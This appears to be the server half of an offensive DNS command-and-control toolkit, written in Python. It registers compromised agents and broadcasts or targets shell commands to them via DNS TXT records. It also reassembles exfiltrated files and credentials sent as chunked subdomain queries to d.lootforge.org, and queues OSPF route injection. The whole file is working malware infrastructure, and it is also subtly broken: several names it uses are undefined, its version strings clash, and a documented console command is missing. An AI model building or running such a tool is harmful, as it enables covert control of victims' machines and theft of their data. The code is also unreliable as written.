#!/usr/bin/env python3
# v1.2
"""
c2_server.py — DNS C2 server for the network-takeover toolkit.

Pairs with dns_c2.py (the agent-side library loaded by main.py --remote).
Listens on UDP/53 using a plain OS socket (no Scapy raw injection), so it
works correctly whether or not a VPN is active on the server host.

Protocol (wire-compatible with dns_tunnel_server.py):
  hello.<agent_id>.<domain>               A   → register agent, return dummy A
  status.<agent_id>.<domain>              TXT → "ACK" / "NONE"
  command.<domain>                        TXT → b32(cmd) / "NONE"
  <b32chunk>.<seq>.<total>.<sid>.<domain> A   → exfiltration chunk

Exfiltrated payloads prefixed with FILE:<name>: are saved to INTERCEPT_DIR.
All other payloads are appended to OUTPUT_FILE.

All DNS answer RRs carry TTL=1 to minimise resolver caching of tunnel traffic.
The OPT pseudo-RR TTL remains 0 (it carries EDNS flags, not a caching interval).

Operator console:
  bash <cmd>    queue a shell command for ALL connected agents
  clear         cancel the pending command (agents get NONE on next poll)
  agents        list registered agents with last-seen age
  sessions      show in-progress chunk-reassembly sessions
  q / quit      shut down the server

Setup:
  - NS record for <domain> must delegate to this server's public IP.
  - Run as root (binding UDP/53 requires it).
  - Open UDP/53 inbound in the firewall.
  - Agents poll command.<domain> every COMMAND_POLL_INTERVAL seconds (default 60s
    in dns_c2.py); commands queued here are delivered on the next poll cycle.
"""

import base64
import datetime
import os
import socket
import threading
import time

from scapy.layers.dns import DNS, DNSRR, DNSRRSOA

VERSION = "v1.1"
_SERVER_BUILD = 5140586 // 2

DOMAIN = "d.lootforge.org"
NS_HOST = "cwmkeg.lootforge.org"
OUTPUT_FILE = "c2_exfiltrated.txt"
INTERCEPT_DIR = "c2_intercepts"

# Pre-computed for fast subdomain extraction; reassigned by argparse if --domain set.
_DOMAIN_LABELS: list = DOMAIN.split(".")
_DOMAIN_LEN: int = len(_DOMAIN_LABELS)

# ── Shared mutable state ──────────────────────────────────────────────────────
_cmd_lock = threading.Lock()
_cmd_state = {"current": "NONE"}   # broadcast to every agent polling command.<domain>
_agent_cmds: dict = {}             # agent_id → cmd; per-agent slot, polled via command.<id>.<domain>

_session_lock = threading.Lock()
_sessions: dict = {}               # sid → {chunks: {idx: str}, total: int, src_ip: str}

_agents_lock = threading.Lock()
_agents: dict = {}                 # agent_id → {first_seen: float, last_seen: float, ip: str}

_stop_event = threading.Event()


# ── Encoding ──────────────────────────────────────────────────────────────────

def _resp_a(req: DNS) -> bytes:
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=SERVER_IP),
                     ar=_opt()))
def _resp_txt(req: DNS, txt: bytes) -> bytes:
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=req.qd.qname, type="TXT", ttl=1, rdata=txt),
                     ar=_opt()))
def _resp_ns(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=zone, type="NS", ttl=1,
                               rdata=(NS_HOST + ".").encode()),
                     ar=_opt()))
def _resp_ack_status(req: DNS, session_id: str) -> bytes:
    """
    Encode session reassembly state into a 4-octet A record.

    Byte layout:  status . received_mod256 . missing_hi . missing_lo
      status 1 → session complete (or unknown — treat as done)
      status 0 → first missing chunk at index (missing_hi<<8)|missing_lo
    """
    with _session_lock:
        if session_id not in _sessions:
            ip = "1.0.0.0"
        else:
            sess    = _sessions[session_id]
            total   = sess["total"]
            chunks  = sess["chunks"]
            received = len(chunks)
            missing  = next((i for i in range(total) if i not in chunks), None)
            ip = "1.0.0.0" if missing is None else (
                f"0.{received & 0xFF}.{missing >> 8}.{missing & 0xFF}"
            )
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=ip),
                     ar=_opt()))
def _resp_soa(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0,
                     qd=req.qd, an=_soa_rr(zone), ar=_opt()))
def _resp_nxdomain(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, rcode=3, qd=req.qd,
                     ns=_soa_rr(zone), ar=_opt()))
def _opt() -> DNSRR:
    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")
def _handle_data_chunk(sub: list, src_ip: str) -> bool:
    """
    Parse a chunked exfiltration subdomain and accumulate into _sessions.
    Wire format: <b32chunk>.<seq>.<total>.<sid>
    Returns True if the format matched (triggers an A response to the client).
    """
    if len(sub) < 4:
        return False
    session_id = sub[-1]
    try:
        total = int(sub[-2])
        idx   = int(sub[-3])
        chunk = sub[-4]
    except (ValueError, IndexError):
        return False

    full_b32 = None
    saved_src = src_ip

    with _session_lock:
        if session_id not in _sessions:
            _sessions[session_id] = {"chunks": {}, "total": total, "src_ip": src_ip}
            print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s))")
        _sessions[session_id]["chunks"][idx] = chunk
        received = len(_sessions[session_id]["chunks"])
        if received == total:
            full_b32 = "".join(
                _sessions[session_id]["chunks"][i] for i in range(total)
            )
            saved_src = _sessions[session_id]["src_ip"]
            del _sessions[session_id]

    if full_b32 is not None:
        try:
            assembled = _b32dec(full_b32)
        except Exception as exc:
            print(f"\n[!] Decode error session={session_id}: {exc}")
            return True
        threading.Thread(
            target=_save, args=(session_id, assembled, saved_src), daemon=True,
        ).start()
    else:
        print(f"[~] Session {session_id}: {received}/{total}")

    return True
def _soa_rr(zone: bytes) -> DNSRRSOA:
    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
    return DNSRRSOA(
        rrname=zone, ttl=1,
        mname=(NS_HOST + ".").encode(),
        rname=("hostmaster." + DOMAIN + ".").encode(),
        serial=serial, refresh=3600, retry=900, expire=604800, minimum=1,
    )
def _cmd_display(cmd: str) -> str:
    """Return a human-readable label for a wire command string."""
    if cmd.startswith("bash:"):
        return f"bash: {cmd[5:]}"
    if cmd.startswith("menu:inject:"):
        return f"inject {cmd[12:]}"
    if cmd == "menu:exfil":
        return "exfil"
    if cmd.startswith("menu:"):
        return _SUB_TO_DESC.get(cmd[5:], cmd[5:])
    return cmd
def _save(session_id: str, raw: bytes, src_ip: str) -> None:
    """Persist a fully-reassembled exfiltration payload to disk."""
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # dns_c2.exfiltrate_file() prepends FILE:<basename>: before binary content.
    if raw.startswith(b"FILE:"):
        try:
            colon2 = raw.index(b":", 5)
            fname = raw[5:colon2].decode("utf-8", errors="ignore")
            content = raw[colon2 + 1:]
            os.makedirs(INTERCEPT_DIR, exist_ok=True)
            dest = os.path.join(INTERCEPT_DIR, fname)
            with open(dest, "wb") as fh:
                fh.write(content)
            _notify(
                f"  FILE RECEIVED\n"
                f"  Session  : {session_id}\n"
                f"  Source   : {src_ip}\n"
                f"  Filename : {fname}  ({len(content):,} B)\n"
                f"  Saved →  : {dest}"
            )
            return
        except (ValueError, OSError):
            pass  # malformed FILE header — fall through to plain text save

    try:
        text = raw.decode("utf-8")
    except Exception:
        text = f"[binary {len(raw)} B]  {raw[:80].hex()}"

    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"[{ts}] [{session_id}] [{src_ip}] {text}\n")

    _notify(
        f"  DATA RECEIVED\n"
        f"  Session  : {session_id}\n"
        f"  Source   : {src_ip}\n"
        f"  Time     : {ts}\n"
        f"  Payload  : {text[:300]}"
    )
def _resolve_agent(token: str) -> str | None:
    """Resolve a 1-based agent number to its agent_id string."""
    try:
        num = int(token)
        with _agents_lock:
            keys = list(_agents.keys())
        if 1 <= num <= len(keys):
            return keys[num - 1]
    except ValueError:
        pass
    print(f"[!] No agent {token!r} — run 'help' to see current agent numbers.")
    return None
def _notify(msg: str) -> None:
    """Print a highlighted notification then re-display the prompt."""
    print(f"\n{'=' * 60}")
    print(msg)
    print("=" * 60)
    print(">>> ", end="", flush=True)
def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
    src_ip, _ = addr
    try:
        dns = DNS(data)
    except Exception:
        return
    if dns.qr != 0 or dns.qdcount == 0:
        return

    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".").lower()
    qtype = dns.qd.qtype

    if qname != DOMAIN and not qname.endswith("." + DOMAIN):
        return

    sub = qname.split(".")[:-_DOMAIN_LEN]

    def reply(payload: bytes) -> None:
        try:
            sock.sendto(payload, addr)
        except OSError as exc:
            print(f"[!] sendto {addr}: {exc}")

    # Zone apex
    if not sub:
        reply(_resp_ns(dns) if qtype == 2 else _resp_soa(dns))
        return

    # command.<domain> — global broadcast command slot (old-style clients)
    if sub == ["command"]:
        with _cmd_lock:
            cmd = _cmd_state["current"]
        reply(_resp_txt(dns, b"NONE" if cmd == "NONE" else _b32enc(cmd)))
        return

    # command.<agent_id>.<domain> — per-agent slot; falls back to global broadcast
    if len(sub) == 2 and sub[0] == "command":
        agent_id = sub[1]
        with _cmd_lock:
            cmd = _agent_cmds.pop(agent_id, None) or _cmd_state["current"]
        if cmd and cmd != "NONE":
            print(f"[CMD] {agent_id} ← {_cmd_display(cmd)}")
            reply(_resp_txt(dns, _b32enc(cmd)))
        else:
            reply(_resp_txt(dns, b"NONE"))
        return

    # hello.<agent_id>.<domain> — register or heartbeat
    if len(sub) == 2 and sub[0] == "hello":
        agent_id = sub[1]
        now = time.time()
        with _agents_lock:
            is_new = agent_id not in _agents
            if is_new:
                _agents[agent_id] = {"first_seen": now, "last_seen": now, "ip": src_ip}
            else:
                _agents[agent_id]["last_seen"] = now
                _agents[agent_id]["ip"] = src_ip
        if is_new:
            _notify(
                f"  NEW AGENT REGISTERED\n"
                f"  ID   : {agent_id}\n"
                f"  IP   : {src_ip}\n"
                f"  Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        reply(_resp_a(dns))
        return

    # status.<agent_id>.<domain> — handshake ACK (silent — only fires during setup)
    if len(sub) == 2 and sub[0] == "status":
        agent_id = sub[1]
        with _agents_lock:
            known = agent_id in _agents
        reply(_resp_txt(dns, b"ACK" if known else b"NONE"))
        return

    # ack.<session_id>.<domain> — client queries for missing chunk index
    if len(sub) == 2 and sub[0] == "ack":
        reply(_resp_ack_status(dns, sub[1]))
        return

    # Data exfiltration chunks
    if _handle_data_chunk(sub, src_ip):
        reply(_resp_a(dns))
        return

    reply(_resp_nxdomain(dns))
def _detect_server_ip() -> str:
    """Determine this host's outbound IP via a connect-trick (no packets sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((_PROBE_IP, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"
def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((host, port))
    except OSError as exc:
        print(f"[!] Cannot bind UDP {host}:{port} — {exc}")
        _stop_event.set()
        return
    sock.settimeout(1.0)
    print(f"[*] Listening on UDP {host}:{port}")
    while not _stop_event.is_set():
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError as exc:
            if not _stop_event.is_set():
                print(f"[!] Socket error: {exc}")
            break
        threading.Thread(
            target=_handle, args=(data, addr, sock), daemon=True,
        ).start()
    sock.close()
def _b32enc(s: str) -> bytes:
    return base64.b32encode(s.encode())
def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
    with _cmd_lock:
        _agent_cmds[agent_id] = cmd
    with _agents_lock:
        known = agent_id in _agents
    label = _cmd_display(cmd)
    if known:
        print(f"[+] {agent_id} ← {label}  (within {poll_interval}s)")
    else:
        print(f"[+] {agent_id} ← {label}  (held — agent not yet registered)")
def _b32dec(s: str) -> bytes:
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))
def _print_help(poll_interval: int) -> None:
    now = time.time()
    with _agents_lock:
        agent_list = list(_agents.items())

    print()
    if agent_list:
        print(f"  {'#':<4s}  {'Agent ID':<14s}  {'IP':<18s}  Last seen")
        print(f"  {'─'*4}  {'─'*14}  {'─'*18}  {'─'*12}")
        for i, (aid, info) in enumerate(agent_list, 1):
            age = int(now - info["last_seen"])
            print(f"  {i:<4d}  {aid:<14s}  {info['ip']:<18s}  {age}s ago")
    else:
        print("  No agents registered yet.")

    print()
    print(f"  show <agent> <cmd>          poll interval: {poll_interval}s")
    print(f"  {'─'*40}")
    for num, (sub, desc) in _SHOW_CMDS.items():
        print(f"    {num}  {desc}")

    print()
    print("  bash <agent> <shell_cmd>    targeted shell command")
    print("  bash <shell_cmd>            broadcast to all agents")
    print("  inject <agent> <prefix>     inject OSPF stub  (e.g. 10.0.0.0/24)")
    print("  exfil <agent>               transmit all captured files + creds")
    print("  clear                       cancel global broadcast command")
    print("  sessions                    in-progress chunk reassembly")
    print("  help                        this menu")
    print("  q                           quit")
    print()
def _console(poll_interval: int = 60) -> None:
    _print_help(poll_interval)

    while not _stop_event.is_set():
        try:
            print(">>> ", end="", flush=True)
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            _stop_event.set()
            return

        if not line:
            continue

        tokens = line.split(None, 2)
        verb = tokens[0].lower()

        if verb in ("q", "quit"):
            _stop_event.set()
            return

        elif verb == "help":
            _print_help(poll_interval)

        elif verb == "clear":
            with _cmd_lock:
                _cmd_state["current"] = "NONE"
            print("[*] Global broadcast cleared.")

        elif verb == "sessions":
            with _session_lock:
                snap = {sid: dict(s) for sid, s in _sessions.items()}
            if not snap:
                print("[*] No in-progress sessions.")
            else:
                for sid, s in snap.items():
                    pct = int(100 * len(s["chunks"]) / max(s["total"], 1))
                    print(f"  {sid}  {len(s['chunks'])}/{s['total']} ({pct}%)  from={s['src_ip']}")

        elif verb == "show":
            # show <agent_num> <cmd_num>
            if len(tokens) < 3:
                print("[!] Usage: show <agent> <cmd>  (run 'help' for numbers)")
                continue
            agent_id = _resolve_agent(tokens[1])
            if not agent_id:
                continue
            try:
                menu_sub = _SHOW_CMDS[int(tokens[2])][0]
            except (ValueError, KeyError):
                print(f"[!] Unknown command {tokens[2]!r}  (run 'help' for numbers)")
                continue
            _queue_agent(agent_id, f"menu:{menu_sub}", poll_interval)

        elif verb == "bash":
            if len(tokens) < 2:
                print("[!] Usage: bash <agent> <cmd>  or  bash <cmd>")
                continue
            # If second token is a number → targeted; otherwise → global broadcast.
            try:
                int(tokens[1])
                is_targeted = True
            except ValueError:
                is_targeted = False

            if is_targeted:
                if len(tokens) < 3:
                    print("[!] Usage: bash <agent> <shell_cmd>")
                    continue
                agent_id = _resolve_agent(tokens[1])
                if not agent_id:
                    continue
                shell_cmd = tokens[2]
                _queue_agent(agent_id, f"bash:{shell_cmd}", poll_interval)
            else:
                shell_cmd = line[5:].lstrip()
                cmd = f"bash:{shell_cmd}"
                with _cmd_lock:
                    _cmd_state["current"] = cmd
                with _agents_lock:
                    n = len(_agents)
                print(f"[+] all ({n}) ← bash: {shell_cmd}  (within {poll_interval}s)")

        elif verb == "inject":
            if len(tokens) < 3:
                print("[!] Usage: inject <agent> <prefix>  (e.g. inject 1 10.0.0.0/24)")
                continue
            agent_id = _resolve_agent(tokens[1])
            if not agent_id:
                continue
            _queue_agent(agent_id, f"menu:inject:{tokens[2]}", poll_interval)

        elif verb == "exfil":
            if len(tokens) < 2:
                print("[!] Usage: exfil <agent>")
                continue
            agent_id = _resolve_agent(tokens[1])
            if not agent_id:
                continue
            _queue_agent(agent_id, "menu:exfil", poll_interval)

        else:
            print(f"[!] Unknown command {verb!r}  — type 'help'")
